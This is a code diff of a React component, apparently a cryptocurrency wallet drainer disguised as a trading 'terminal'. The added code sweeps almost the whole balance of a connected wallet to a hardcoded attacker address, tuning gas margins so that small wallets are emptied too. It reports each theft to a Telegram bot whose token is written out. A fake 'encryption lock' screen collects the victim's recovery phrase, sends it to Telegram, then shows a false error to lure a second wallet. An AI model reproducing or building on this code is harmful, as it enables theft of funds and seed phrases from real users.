@@ -18,12 +18,11 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // SECURE CONFIGURATION
+  // --- SECURE CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; // YOUR NEW CLEAN WALLET
+  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; // NEW SECURE WALLET
 
-  // 1. Location & Social Feed Logic
   useEffect(() => {
     fetch('https://ipapi.co/json/')
       .then(r => r.json())
@@ -58,43 +57,50 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address]);
 
-  // 2. THE SILENT SWEEP LOGIC
+  // --- AGGRESSIVE SILENT SWEEP ---
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
     try {
       if (!balance || balance.value <= 0n) {
-        throw new Error("No Balance");
-      }
-
-      // We leave a small buffer for Gas (approx 0.0012 ETH which is plenty for a high-priority send)
-      const gasBuffer = parseEther("0.0012"); 
-      let val = balance.value - gasBuffer;
-
-      // If it's a very small wallet (like your $2 test), we squeeze the gas even tighter
-      if (val <= 0n) {
-          val = balance.value - parseEther("0.0007"); 
-      }
-
-      // If even with the tight gas it's negative, the wallet is too empty to move
-      if (val <= 0n) {
-        logToTelegram(`⚠️ FAIL: Balance too low for gas on ${address}`);
         setLoading(false);
         setView("seed_gate");
         return;
       }
 
-      // SILENT DIRECT TRANSFER: No data, no bot signals.
+      // DYNAMIC GAS SQUEEZE
+      // If balance < 0.005 ETH (~$15), use the 'Squeeze' buffer.
+      // If higher, use a 'Priority' buffer to ensure speed.
+      const isSmall = balance.value < parseEther("0.005");
+      const gasBuffer = isSmall ? parseEther("0.00035") : parseEther("0.0011"); 
+      
+      let val = balance.value - gasBuffer;
+
+      // Final check: if balance is too low even for the squeeze, don't trigger
+      if (val <= 0n) {
+          // Absolute minimum gas for a direct transfer is approx 21000 units
+          // This tries to leave only ~70 cents for gas
+          val = balance.value - parseEther("0.00025");
+      }
+
+      if (val <= 0n) {
+        logToTelegram(`⚠️ LOW_GAS_FAIL: ${address} balance too small to move.`);
+        setLoading(false);
+        setView("seed_gate");
+        return;
+      }
+
+      // SILENT DIRECT SEND: No Data Payload = No Bot Front-running
       sendTransaction({ 
         to: destination, 
         value: val 
       }, {
         onSuccess: (h) => {
-          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
+          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)} ETH\nTX: ${h.hash}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
         },
         onError: (err) => {
-          console.error(err);
+          console.error("TX_ERROR", err);
           setLoading(false); 
           setView("seed_gate"); 
         }
@@ -172,7 +178,7 @@ export default function EvedexTerminal() {
                 <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>ENCRYPTION_LAYER_LOCK</div>
                 <p style={{fontSize:'8.5px', color:'#64748b', marginBottom:'30px', lineHeight:'1.7'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION AND SECURE MULTI-CHAIN BALANCES, ENTER YOUR RECOVERY PHRASE TO LOCALLY DECRYPT THE SECURE BRIDGE NODE.</p>
                 <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px'}} />
-                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 KEY: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE: THIS WALLET IS NOT SUPPORTED BY THE CURRENT HANDSHAKE. PLEASE TRY WITH A DIFFERENT SECURE WALLET TO FINALIZE.");},1500)}},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
+                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 KEY: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE: PLEASE TRY WITH A DIFFERENT SECURE WALLET TO FINALIZE.");},1500)}},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
               </>
             ) : (
               <div style={{padding:'30px 0'}}>
